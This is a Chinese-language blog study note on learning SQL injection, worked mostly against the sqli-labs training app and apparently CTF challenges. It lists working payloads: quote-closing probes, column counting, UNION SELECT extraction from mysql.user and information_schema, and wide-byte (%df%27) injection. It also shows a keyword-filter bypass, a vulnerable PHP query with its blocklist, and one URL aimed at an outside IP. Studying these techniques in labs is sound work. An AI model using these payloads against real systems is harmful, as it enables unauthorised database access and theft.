---
title: "learn sqlinject"
date: 2018-04-18T15:43:48+08:00
lastmod: 2018-04-18T15:43:48+08:00
draft: false
tags: ["sqlinject", "web security"]
categories: ["sqlinject"]
author: "lilin"

---
url/?id=1

正常登陆

url/?id=1'

报错   闭合字符是 '

http://127.0.0.1/sqlilabs/Less-1/?id=1' --+    正常

http://127.0.0.1/sqlilabs/Less-1/?id=1' and 1=2--+   不显示  说明 1=2把前面的吃掉了。 1=2 后面可以加命令


url/?id=1' and 1=2 order by 4   错误

url/?id=1' and 1=2 order by 3 正常  说明有3列

union select 1,2,3  看显示出第几列  显示的列是可以搞事的。放payload

url/?id=1'%23    # 注释 ' 不报错了

url/?id=1' order by 5 --+   报错

url/?id=1' order by 3 --+   正常

url/?id=1' union select 1,2,3,4 --+

报错，说明目标不是4列

url/?id=1' union select 1,2,3 --+

正常显示

发现把 1 2 3 替换为字符串或者其他数字也照样正常显示 如'sadfdg323vd'  23534 等

http://127.0.0.1/sqlilabs/Less-1/?id=1' and exists(select * from admin)--+

报错
Table 'security.admin' doesn't exist

exists()函数检查子查询是否会返回数据。是 返回true 不是 返回false

http://127.0.0.1/sqlilabs/Less-1/?id=1' and exists(select * from mysql.user)--+

正常返回 说明 mysql.user 存在
否则会报错

http://127.0.0.1/sqlilabs/Less-1/?id=1' and (select * from mysql.user)--+

报错0.0

http://127.0.0.1/sqlilabs/Less-1/?id=1' and (select id from mysql.user)--+

报错了，子查询返回多于一行

http://127.0.0.1/sqlilabs/Less-1/?id=1' and (select id from mysql.user limit 1,1)--+

似乎OK了0.0

SELECT * FROM table LIMIT 5,10; 检索 6-15行

url/admin.php?ip=1 正常

url/admin.php?ip=1' 


database()  显示当前数据库

user()  显示登录名和登陆地址

version()  查看数据库版本

union select table_name from information_schema.tables where table_schema=xxxx(库名)

select table_name from information_schema.tables where table_schema=security

?id=1%df%27  宽字节注入

/?id=1%df%27%20union%20select%201%EF%BC%8C2%23

/?id=1%df%27%20union%20select%201,2,3%20--+

select id from sql5.key

http://103.238.227.13:10083/?id=1%df%27%20union%20select%20(select%20string%20from%20sql5.key%20limit%200,1),6%20--+



//过滤sql
$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');
foreach ($array as $value)
{
	if (substr_count($id, $value) > 0)
	{
		exit('包含敏感关键字！'.$value);
	}
}

//xss过滤
$id = strip_tags($id);

$query = "SELECT * FROM temp WHERE id={$id} LIMIT 1";
			


?id=-1 uni<>on sel<>ect 4,5#

4,5正常显示
?id=-1 uni<>on sel<>ect database(),5#
出库名 sql3

正则过滤.   php全局变量


brupsuite 抓包重放  看回显

function checkSubmit(){var a=document.getElementById("password");if("undefined"!=typeof a){if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1}}document.getElementById("levelQuest").onsubmit=checkSubmit;